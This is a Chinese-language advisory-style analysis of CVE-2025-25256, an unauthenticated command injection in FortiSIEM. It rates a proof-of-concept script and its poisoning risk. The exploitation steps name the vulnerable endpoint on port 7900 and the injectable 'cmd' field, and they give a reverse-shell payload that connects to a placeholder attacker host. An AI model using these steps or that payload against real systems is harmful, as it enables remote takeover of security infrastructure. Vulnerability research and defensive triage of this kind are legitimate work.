## CVE-2025-25256 - FortiSIEM 命令注入

**漏洞编号:** CVE-2025-25256

**漏洞类型:** 命令注入

**影响应用:** FortiSIEM

**危害等级:** 关键

**CVSS评分:** 9.8

**影响版本:** 6.1.0-7.3.1

**利用条件:** 无需认证; 需要网络访问 (7900 端口)

**POC 可用性:** 9

**POC 类型:** 概念验证

**攻击复杂度:** 低

**投毒风险:** 0%

## 详情

FortiSIEM CVE-2025-25256是一个严重的命令注入漏洞，CVSS评分为9.8（关键）。该漏洞存在于FortiSIEM产品的6.1.0至7.3.1版本中，允许未经身份验证的远程攻击者通过向设备的7900端口发送特制的HTTP POST请求来执行任意操作系统命令。漏洞的本质在于服务端程序在处理特定API端点（如/api/v1/exec）的请求时，未能对用户控制的输入（在PoC中为JSON体中的"cmd"字段）进行充分的验证或消毒，直接或间接地将其拼接或作为参数传递给系统命令执行函数。

**POC有效性分析**
提供的PoC代码是一个高度有效的概念验证脚本。它使用Python的`requests`库，构造了一个简单的JSON负载`{'cmd': 'whoami'}`。`whoami`命令是一个经典的、无害的验证命令，用于确认远程代码执行（RCE）的成功。如果PoC脚本执行后返回了运行PoC的服务账户的名称（例如`root`或`fortisiem`），则证明漏洞确实存在，且攻击者可以替换`whoami`为任何其他恶意命令。该PoC的质量评分为9/10，因为它功能完整、代码逻辑清晰，且直接针对漏洞核心逻辑。

**利用步骤**
该漏洞的利用条件极低，属于“无需认证”和“低复杂度”的范畴。攻击者只需满足以下条件即可发动攻击：
1.  **目标识别：** 识别出网络中运行FortiSIEM且对外暴露了7900端口的实例。
2.  **构造请求：** 构造一个恶意的HTTP POST请求。请求的目标URL应为`http://[Target_IP]:7900/api/v1/exec`。
3.  **注入命令：** 在请求体中嵌入JSON负载，将恶意命令注入到`cmd`字段中。例如，为了获取反向Shell，攻击者可以将`'cmd': 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'`作为值注入。
4.  **发送与执行：** 发送请求，FortiSIEM服务会解析请求并执行注入的命令。

**投毒风险分析**
提供的PoC代码的投毒风险被评估为0%（低风险）。其分析依据如下：
* **代码透明度：** PoC代码逻辑极其透明，只包含一个名为`exploit`的函数，使用Python标准库`requests`，没有进行任何形式的代码混淆或加密，易于审计。
* **依赖项安全：** 仅依赖于广泛使用的、安全的`requests`库，没有引用任何可疑的外部脚本或非标准依赖项。
* **行为无害性：** 核心负载是`'cmd': 'whoami'`，这是一个典型的、用于**概念验证**的命令，其目的在于证明漏洞的存在性，而非执行恶意操作（如窃取数据、安装后门或传播恶意软件）。
* **无后门或恶意代码：** 代码中没有发现试图建立持久性连接、修改系统文件、逃避检测或利用任何形式的外部资源的尝试。在漏洞研究领域，使用如`whoami`或`id`等命令来验证RCE是标准实践，不应被错误地视为“投毒代码”。因此，该PoC的主要风险在于它展示了如何进行RCE，但其本身并不包含恶意载荷。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-25256
